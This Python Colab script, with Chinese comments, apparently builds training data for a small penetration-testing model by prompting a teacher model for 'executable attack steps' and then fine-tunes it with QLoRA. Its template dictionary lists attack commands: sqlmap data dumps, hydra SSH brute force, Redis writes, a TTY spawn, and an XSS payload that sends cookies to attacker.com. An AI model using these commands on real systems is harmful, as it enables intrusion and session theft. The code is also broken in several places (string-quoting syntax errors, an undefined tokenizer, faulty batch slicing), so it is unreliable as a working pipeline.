#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSec 4B Model - Colab Training Script
=========================================
✅ Colab T4/P100 優化
✅ Google Drive 集成
✅ 完整監控和恢復

使用方法:
from colab_train import main
main()
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from typing import Optional

# UTF-8 編碼
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

# ═══════════════════════════════════════════════════════════════════════════
# Google Drive 設置
# ═══════════════════════════════════════════════════════════════════════════

def setup_google_drive():
    """掛載 Google Drive 並設置路徑"""
    from google.colab import drive
    import os

    print("📂 掛載 Google Drive...")
    drive.mount('/content/drive')

    # 設置項目路徑
    PROJECT_PATH = '/content/drive/MyDrive/Cybersecurity-4B-AI-Model'
    DATA_PATH = os.path.join(PROJECT_PATH, 'data')
    OUTPUT_PATH = os.path.join(PROJECT_PATH, 'outputs')

    os.makedirs(DATA_PATH, exist_ok=True)
    os.makedirs(OUTPUT_PATH, exist_ok=True)

    # 創建符號鏈接
    if not os.path.exists('data'):
        os.symlink(os.path.join(PROJECT_PATH, 'data'), 'data')

    print(f"✅ 項目路徑: {PROJECT_PATH}")
    print(f"✅ 數據路徑: {DATA_PATH}")
    print(f"✅ 輸出路徑: {OUTPUT_PATH}")

    return PROJECT_PATH, DATA_PATH, OUTPUT_PATH

# ═══════════════════════════════════════════════════════════════════════════
# 依賴安裝
# ═══════════════════════════════════════════════════════════════════════════

def install_dependencies():
    """安裝必要的依賴"""
    import subprocess
    import sys

    print("📦 安裝依賴...")

    packages = [
        'transformers>=4.40.0',
        'torch>=2.1.0',
        'accelerate>=0.28.0',
        'peft>=0.10.0',
        'bitsandbytes>=0.41.0',
        'trl>=0.8.0',
        'scikit-learn',
        'tqdm',
    ]

    for pkg in packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', pkg])

    print("✅ 依賴安裝完成")

# ═══════════════════════════════════════════════════════════════════════════
# GPU 診斷
# ═══════════════════════════════════════════════════════════════════════════

def diagnose_gpu():
    """診斷 GPU 狀態"""
    import torch

    print("\n" + "="*60)
    print("🔍 GPU 診斷")
    print("="*60)

    if torch.cuda.is_available():
        gpu_name = torch.cuda.get_device_name(0)
        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        gpu_mem_alloc = torch.cuda.memory_allocated() / (1024**3)
        gpu_mem_reserved = torch.cuda.memory_reserved() / (1024**3)

        print(f"\n✅ GPU: {gpu_name}")
        print(f"   總記憶體: {gpu_mem:.2f} GB")
        print(f"   已分配: {gpu_mem_alloc:.2f} GB")
        print(f"   已保留: {gpu_mem_reserved:.2f} GB")
        print(f"   可用: {gpu_mem - gpu_mem_reserved:.2f} GB")

        # 計算可用 batch size
        if gpu_mem >= 14:  # T4/P100
            batch_size = 4
            gradient_accumulation = 4
        elif gpu_mem >= 10:
            batch_size = 2
            gradient_accumulation = 8
        else:
            batch_size = 1
            gradient_accumulation = 16

        print(f"\n📊 推薦配置:")
        print(f"   Batch Size: {batch_size}")
        print(f"   Gradient Accumulation: {gradient_accumulation}")
        print(f"   Effective Batch: {batch_size * gradient_accumulation}")

        return True, batch_size, gradient_accumulation
    else:
        print("\n⚠️ 未檢測到 GPU，使用 CPU (會很慢)")
        return False, 1, 64

# ═══════════════════════════════════════════════════════════════════════════
# 數據生成 (Multi-Teacher Distillation)
# ═══════════════════════════════════════════════════════════════════════════

import torch
from transformers import AutoModelForCausalLM, AutoTokenizer
import gc

def generate_tinyllm_data(
    output_file: str = "data/distilled_tinyllm.jsonl",
    num_samples: int = 2000,
    model_name: str = "Qwen/Qwen2.5-7B-Instruct"
):
    """生成 TinyLLM 格式的訓練數據"""
    import json
    import random
    from tqdm import tqdm

    print(f"\n📝 生成 TinyLLM 數據...")
    print(f"   模型: {model_name}")
    print(f"   樣本數: {num_samples}")

    # 場景模板
    scenarios = [
        {"scenario": "SMBv1 enabled on Windows Server 2016", "category": "scan"},
        {"scenario": "Web app has SQL injection on login form", "category": "sqli"},
        {"scenario": "XSS found on comment form", "category": "xss"},
        {"scenario": "Redis server accessible without auth", "category": "service"},
        {"scenario": "SSH weak password (root:toor)", "category": "creds"},
        {"scenario": "JWT token with weak secret", "category": "auth"},
        {"scenario": "Docker daemon exposed", "category": "service"},
        {"scenario": "Sudo version 1.8.31 vulnerable", "category": "priv-esc"},
        {"scenario": "Found /admin backup file", "category": "file-disclosure"},
        {"scenario": "MongoDB NoAuth on port 27017", "category": "service"},
    ]

    # 攻擊步驟模板
    step_templates = {
        "scan": [
            ("nmap -p 445 --script smb-vuln-ms17-010 {target}", "Check for MS17-010"),
            ("enum4linux -a {target}", "Enumerate SMB shares"),
            ("smbclient -L //{target}", "List SMB shares"),
        ],
        "sqli": [
            ("sqlmap -u '{url}' --dbs", "Enumerate databases"),
            ("sqlmap -u '{url}' -D {db} --tables", "Enumerate tables"),
            ("sqlmap -u '{url}' -D {db} -T {table} --dump", "Dump data"),
        ],
        "xss": [
            ("<script>alert(1)</script>", "Test basic XSS"),
            ("<img src=x onerror=alert(1)>", "Test event handler"),
            ("'><script>fetch('http://attacker.com?c='+document.cookie)</script>", "Exfiltrate cookie"),
        ],
        "service": [
            ("redis-cli -h {target} INFO", "Check Redis info"),
            ("redis-cli -h {target} CONFIG GET *", "Dump Redis config"),
            ("redis-cli -h {target} SET key 'pwned'", "Write data"),
        ],
        "creds": [
            ("ssh root@{target}", "SSH login attempt"),
            ("hydra -l root -P wordlist.txt ssh://{target}", "Brute force SSH"),
            ("mysql -h {target} -u root -p", "MySQL login attempt"),
        ],
        "auth": [
            ("python3 jwt_tool.py -t {token} -s secret", "Brute force JWT secret"),
            ("python3 -c 'import jwt; print(jwt.decode(token, "weak", algorithms=["HS256"]))'", "Decode JWT"),
        ],
        "priv-esc": [
            ("searchsploit sudo 1.8.31", "Find sudo exploit"),
            ("sudo -l", "Check sudo permissions"),
            ("python3 -c 'import pty; pty.spawn("/bin/bash")'", "Spawn TTY"),
        ],
        "file-disclosure": [
            ("curl {url}/admin/backups.sql", "Download backup"),
            ("curl {url}/phpinfo.php", "Check PHP info"),
            ("gzip -d backup.sql.gz", "Decompress backup"),
        ],
    }

    # 載入模型
    print("\n🔄 載入模型...")
    tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)

    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )

    print(f"✅ 模型載入完成: {model_name}")

    # 生成數據
    data = []
    batch_size = 32

    for i in tqdm(range(0, num_samples, batch_size), desc="Generating"):
        batch = scenarios[i % len(scenarios):min(i+batch_size, len(scenarios))]

        for scenario in batch:
            cat = scenario["category"]

            # 構造對話
            messages = [
                {"role": "system", "content": "You are a professional penetration tester. Given a scenario, provide executable attack steps."},
                {"role": "user", "content": f"Scenario: {scenario['scenario']}\nWhat is the next experiment you would run?"},
            ]

            # 生成回應
            text = tokenizer.apply_chat_template(
                messages,
                tokenize=False,
                add_generation_prompt=True
            )

            inputs = tokenizer(text, return_tensors="pt").to(model.device)

            with torch.no_grad():
                outputs = model.generate(
                    **inputs,
                    max_new_tokens=512,
                    temperature=0.7,
                    top_p=0.9,
                    do_sample=True,
                )

            response = tokenizer.decode(outputs[0], skip_special_tokens=True)

            # TinyLLM 格式
            sample = {
                "messages": messages + [{"role": "assistant", "content": response}],
                "category": cat,
                "scenario": scenario["scenario"],
                "steps": step_templates.get(cat, []),
            }

            data.append(sample)

        # 清理 GPU 記憶體
        del inputs, outputs
        torch.cuda.empty_cache()

    # 保存
    with open(output_file, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')

    print(f"\n✅ 數據已保存: {output_file}")
    print(f"   總樣本數: {len(data)}")

    # 卸載模型
    del model
    gc.collect()
    torch.cuda.empty_cache()

    return output_file

# ═══════════════════════════════════════════════════════════════════════════
# QLoRA Fine-tune (針對 4B 模型優化)
# ═══════════════════════════════════════════════════════════════════════════

def train_with_qlora(
    data_file: str = "data/distilled_tinyllm.jsonl",
    output_dir: str = "outputs/cyber-4b-qlora",
    epochs: int = 3,
    learning_rate: float = 2e-4,
):
    """使用 QLoRA 進行微調"""
    from peft import LoraConfig, get_peft_model, TaskType
    from transformers import TrainingArguments, Trainer, DataCollatorForSeq2Seq
    from datasets import Dataset
    import json

    print(f"\n🚀 開始 QLoRA 訓練...")
    print(f"   數據: {data_file}")
    print(f"   輸出: {output_dir}")
    print(f"   Epochs: {epochs}")

    # 讀取數據
    with open(data_file, 'r', encoding='utf-8') as f:
        raw_data = [json.loads(line) for line in f]

    # 轉換為 dataset 格式
    dataset_data = {
        "text": [
            tokenizer.apply_chat_template(
                item["messages"],
                tokenize=False,
            )
            for item in raw_data
        ]
    }

    dataset = Dataset.from_dict(dataset_data)

    # QLoRA 配置
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        inference_mode=False,
        r=16,
        lora_alpha=32,
        lora_dropout=0.05,
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    )

    # 加載基礎模型
    model_name = "Qwen/Qwen2.5-7B-Instruct"
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16,
        device_map="auto",
    )

    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()

    # 訓練參數
    training_args = TrainingArguments(
        output_dir=output_dir,
        num_train_epochs=epochs,
        per_device_train_batch_size=4,
        gradient_accumulation_steps=4,
        learning_rate=learning_rate,
        logging_steps=10,
        save_strategy="epoch",
        save_total_limit=2,
        fp16=True,
        report_to="none",
        dataloader_pin_memory=False,
    )

    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=DataCollatorForSeq2Seq(tokenizer),
    )

    # 訓練
    print("\n🔥 開始訓練...")
    trainer.train()

    # 保存
    model.save_pretrained(output_dir)
    tokenizer.save_pretrained(output_dir)

    print(f"\n✅ 模型已保存: {output_dir}")

    return output_dir

# ═══════════════════════════════════════════════════════════════════════════
# RAG 模塊 (輕量版)
# ═══════════════════════════════════════════════════════════════════════════

class LightweightRAG:
    """輕量級 RAG - 適合 Colab"""

    def __init__(self, docs_path: str = "data/cve_docs"):
        import faiss
        from sentence_transformers import SentenceTransformer

        self.docs_path = docs_path
        self.embedding_model = None
        self.index = None
        self.documents = []

        # 4-bit 量化嵌入模型
        print("📦 載入嵌入模型 (4-bit)...")
        self.embedding_model = SentenceTransformer(
            "BAAI/bge-small-en-v1.5",
            device="cuda",
            model_kwargs={"torch_dtype": torch.float16},
        )
        print("✅ 嵌入模型載入完成")

    def add_documents(self, texts: list):
        """添加文檔到向量庫"""
        embeddings = self.embedding_model.encode(texts, show_progress_bar=True)

        if self.index is None:
            dimension = embeddings.shape[1]
            self.index = faiss.IndexFlatL2(dimension)

        self.index.add(embeddings)
        self.documents.extend(texts)

        print(f"✅ 已添加 {len(texts)} 文檔")

    def search(self, query: str, k: int = 3) -> list:
        """搜索相關文檔"""
        query_embedding = self.embedding_model.encode([query])

        distances, indices = self.index.search(query_embedding, k)

        results = []
        for i, idx in enumerate(indices[0]):
            if idx < len(self.documents):
                results.append({
                    "text": self.documents[idx],
                    "distance": distances[0][i],
                })

        return results

# ═══════════════════════════════════════════════════════════════════════════
# 主函數
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """主執行函數"""
    print("="*60)
    print("🔐 CyberSec 4B Model - Colab Training")
    print("="*60)

    # 1. 設置 Drive
    PROJECT_PATH, DATA_PATH, OUTPUT_PATH = setup_google_drive()

    # 2. 安裝依賴
    install_dependencies()

    # 3. GPU 診斷
    has_gpu, batch_size, grad_accum = diagnose_gpu()

    if not has_gpu:
        print("\n⚠️ 警告: 未檢測到 GPU，訓練會非常慢")
        print("建議使用 Colab Pro 或本地 GPU")

    # 4. 生成數據
    data_file = os.path.join(DATA_PATH, "distilled_tinyllm.jsonl")
    generate_tinyllm_data(
        output_file=data_file,
        num_samples=2000,
        model_name="Qwen/Qwen2.5-7B-Instruct"
    )

    # 5. QLoRA 訓練
    output_dir = os.path.join(OUTPUT_PATH, "cyber-4b-qlora")
    train_with_qlora(
        data_file=data_file,
        output_dir=output_dir,
        epochs=3,
    )

    # 6. 測試
    print("\n" + "="*60)
    print("🎉 訓練完成!")
    print("="*60)
    print(f"\n📁 模型位置: {output_dir}")
    print(f"📁 數據位置: {data_file}")
    print("\n下一步:")
    print("1. 下載模型文件")
    print("2. 在本地或、生產環境部署")
    print("3. 使用 RAG 模塊增強最新 CVE 知識")

if __name__ == "__main__":
    main()
